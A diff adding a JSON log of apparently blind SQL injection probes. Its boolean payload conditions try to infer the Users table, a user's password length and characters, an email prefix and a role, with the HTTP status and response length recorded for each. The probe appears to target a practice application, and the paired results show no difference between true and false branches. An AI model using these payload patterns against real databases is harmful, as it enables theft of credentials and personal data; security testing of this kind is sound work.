@@ -1,0 +1,62 @@
+[
+ {
+  "test": "AND 1=1 (TRUE branch)",
+  "status": 200,
+  "body_length": 30
+ },
+ {
+  "test": "AND 1=2 (FALSE branch)",
+  "status": 200,
+  "body_length": 30
+ },
+ {
+  "test": "AND count(Users)>0 (TRUE)",
+  "status": 200,
+  "body_length": 30
+ },
+ {
+  "test": "AND count(Users)<1 (FALSE)",
+  "status": 200,
+  "body_length": 30
+ },
+ {
+  "test": "AND len(password)@uid13>30 (TRUE)",
+  "status": 200,
+  "body_length": 30
+ },
+ {
+  "test": "AND len(password)@uid13<10 (FALSE)",
+  "status": 200,
+  "body_length": 30
+ },
+ {
+  "test": "AND substr(password,1,1)@uid13='9' (TRUE)",
+  "status": 500,
+  "body_length": 974
+ },
+ {
+  "test": "AND substr(password,1,1)@uid13='0' (FALSE)",
+  "status": 500,
+  "body_length": 974
+ },
+ {
+  "test": "AND substr(email,1,6)@uid13='bjoer' (TRUE)",
+  "status": 500,
+  "body_length": 982
+ },
+ {
+  "test": "AND substr(email,1,6)@uid13='xjoer' (FALSE)",
+  "status": 500,
+  "body_length": 982
+ },
+ {
+  "test": "AND role@uid13='deluxe' (TRUE)",
+  "status": 500,
+  "body_length": 984
+ },
+ {
+  "test": "AND role@uid13='admin' (FALSE)",
+  "status": 500,
+  "body_length": 982
+ }
+]
